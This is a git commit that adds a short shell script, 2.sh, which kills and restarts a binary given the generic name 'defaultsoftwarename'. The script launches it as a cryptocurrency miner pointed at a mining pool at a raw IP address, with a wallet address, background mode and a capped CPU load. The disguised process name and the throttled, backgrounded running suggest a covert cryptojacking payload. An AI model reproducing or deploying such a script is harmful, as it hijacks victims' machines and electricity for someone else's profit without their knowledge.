fdb611553be1c0eece9ae874fdd6a4d7cbd989ae
coronaisback <63191495+coronaisback@users.noreply.github.com>
2020-04-05 16:44:32 +0200

    Add files via upload

---
+++ 2.sh
@@ -0,0 +1,3 @@
+pkill defaultsoftwarename
+sleep 7
+defaultsoftwarename -o 91.121.49.36:49228 -u 45rUTsg2uSBQoMsnxhcBXcLWxw2xx1n9YMZCJqSkZGa3D6TQ9rqEUCrFMnCsGCqFyf7sHFgZCR4PLB3xatvHLkXiESG88Pe --pass=x:butilka@protonmail.com --rig-id=03 -B --donate-level=0 --print-time=30 --threads=defaultthreads --cpu-priority=4 --background --max-cpu-usage=75 --av=1
